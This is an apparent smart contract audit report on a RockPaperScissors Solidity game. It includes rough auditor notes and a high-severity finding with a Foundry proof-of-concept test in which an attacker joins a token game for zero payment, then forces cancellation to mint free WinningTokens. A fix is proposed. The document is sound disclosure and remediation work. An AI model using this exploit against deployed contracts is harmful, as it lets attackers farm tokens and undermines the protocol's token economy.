1. possible reentrancy attacks with internal functions \_handleTie/\_finishGame/\_cancelGame. however likely not exploitable as both functions updated game.state to finished, and the external functions that call these functions have require checks to make sure game is in Committed stage
2. Can i join token games through joinGameWithEth with 0 tokens and 0 eth? yes i can, and this allows me to keep participating for free, as the winners are minted 2 WT, instead of being transferred from loser to winner ## highest severity bug i think
3. Possible DoS if i keep joining games and just immediately call timeoutReveal, effectively cancelling all the games

to focus:

- Commit-reveal mechanism ensures fair play (no cheating)
- Support for both ETH and token-based games
- Multiple-turn matches with best-of-N scoring
- Automatic prize distribution and winner token rewards
- Timeout protection against non-responsive players

- **Players**: Users who create or join games, commit and reveal moves, and participate in matches
- **Admin**: The protocol administrator who can update timeout parameters and withdraw accumulated fees
- **Contract Owner**: Initially the deployer of the contract, capable of setting a new admin

### [H-1]`RockPaperScissors::joinGameWithEth` Allows Users to Join Token Games Without Paying

**Description:** The `RockPaperScissors::joinGameWithEth` function fails to validate that msg.value > 0. As a result, an attacker can call this function with msg.value == 0 and still successfully join a Token-based Game, provided the original creator also set the bet to 0. The check require(msg.value == game.bet) passes because both values are 0.

**Impact:** An attacker can exploit this by joining a token game without staking any tokens. After joining, the attacker commits a move and immediately calls `timeoutReveal`, which triggers `_cancelGame` — a function that mints 1 WinningToken to both participants. Since the attacker joined without any cost, they effectively farm free tokens. Repeating this at scale enables rapid minting of arbitrary amounts of tokens, undermining the integrity and scarcity of the token economy.

**Proof of Concept:** To test this, I have added the following test function into the current test suite. The following proof of concept demonstrates the exact exploit highlighted above.

```javascript
    address public playerC = makeAddr("playerC");
    address public playerD = makeAddr("playerD");
    uint256 testGameId;

    function testJoinGameWithTokenUsingEth() public {
        // Set up 2 new players, we will be using playerD's account as the attacker
        vm.prank(address(game));
        token.mint(playerC, 10);

        vm.prank(address(game));
        token.mint(playerD, 10);
        vm.stopPrank();

        // Player C first creates a token game
        vm.startPrank(playerC);
        token.approve(address(game), 1);
        testGameId = game.createGameWithToken(TOTAL_TURNS, TIMEOUT);
        vm.stopPrank();

        // Attacker joins the same game using joinGameWithEth (with 0 msg.value)
        vm.startPrank(playerD);
        game.joinGameWithEth(testGameId);
        vm.stopPrank();

        assertEq(token.balanceOf(playerC), 9);
        // verify that player D did not transfer tokens
        assertEq(token.balanceOf(playerD), 10);

        // Verify game state, ensure that player D is in the game
        (address storedPlayerC, address storedPlayerD,,,,,,,,,,,,,, RockPaperScissors.GameState state) =
            game.games(testGameId);

        assertEq(storedPlayerC, playerC);
        assertEq(storedPlayerD, playerD);
        assertEq(uint256(state), uint256(RockPaperScissors.GameState.Created));

        // Commit a move for player D
        bytes32 saltD = keccak256(abi.encodePacked("salt for player D"));
        bytes32 commitD = keccak256(abi.encodePacked(uint8(RockPaperScissors.Move.Rock), saltD));

        vm.startPrank(playerD);
        game.commitMove(testGameId, commitD);
        // Call timeoutReveal immediately after commiting to get a the game cancelled
        game.timeoutReveal(testGameId);
        vm.stopPrank();

        // Verify balances, showing that playerD was able to gain tokens
        assertEq(token.balanceOf(playerC), 10);
        assertEq(token.balanceOf(playerD), 11);
    }
```

**Recommended Mitigation:** An additional check that msg.value > 0 should be included within the function. This would ensure that the function cannot be used to join token games.

```javascript
    function joinGameWithEth(uint256 _gameId) external payable {
        Game storage game = games[_gameId];

        require(game.state == GameState.Created, "Game not open to join");
        require(game.playerA != msg.sender, "Cannot join your own game");
        require(block.timestamp <= game.joinDeadline, "Join deadline passed");
        require(msg.value == game.bet, "Bet amount must match creator's bet");
        require(msg.value > 0, "Eth must be sent to join an Eth game");

        game.playerB = msg.sender;
        emit PlayerJoined(_gameId, msg.sender);
    }
```
